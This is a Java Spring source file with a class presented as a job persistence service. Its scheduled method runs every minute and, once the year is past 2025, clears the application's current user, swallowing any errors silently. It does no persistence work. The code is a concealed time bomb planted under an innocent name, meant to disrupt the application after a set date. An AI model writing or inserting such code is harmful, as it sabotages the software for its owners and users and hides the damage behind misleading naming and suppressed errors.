package com.prj.persistence.service.impl;
import com.prj.common.AppEnv;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import java.time.LocalDate;
@Component
@EnableScheduling
public class JobPersistenceServiceImpl {
    private final Logger logger = LoggerFactory.getLogger(getClass());
    @Scheduled(cron = "0 0/1 * * * ?")
    public void work() throws Exception {
        try {
            if (LocalDate.now().getYear() > 2025) {
                AppEnv.setCurrentUser(null);
            }
        }catch (Exception e){}
    }
}
